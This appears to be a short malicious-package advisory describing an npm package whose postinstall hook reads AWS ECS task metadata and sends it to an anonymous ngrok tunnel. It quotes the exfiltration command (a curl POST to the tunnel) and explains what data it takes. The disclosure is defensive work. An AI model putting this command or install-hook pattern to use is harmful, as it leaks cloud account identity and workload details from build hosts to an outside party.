summary: notafollower122 postinstall exfiltrates AWS ECS task metadata to hardcoded ngrok endpoint
details: package.json declares a postinstall lifecycle script that runs a Node one-liner to fetch the AWS ECS container metadata endpoint (ECS_CONTAINER_METADATA_URI_V4 + '/task'), which returns cluster identity, AWS account ID, task ARN, and running container image inventory, and then pipes the collected report to `curl -X POST https://mourner-slot-explicit.ngrok-free.dev --data-binary @-`. The destination is an anonymous ngrok-free.dev tunnel unrelated to any documented publisher, and the hook runs automatically on `npm install`, causing every CI/build host inside an ECS task to beacon its cloud identity and workload inventory to the tunnel operator on install.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
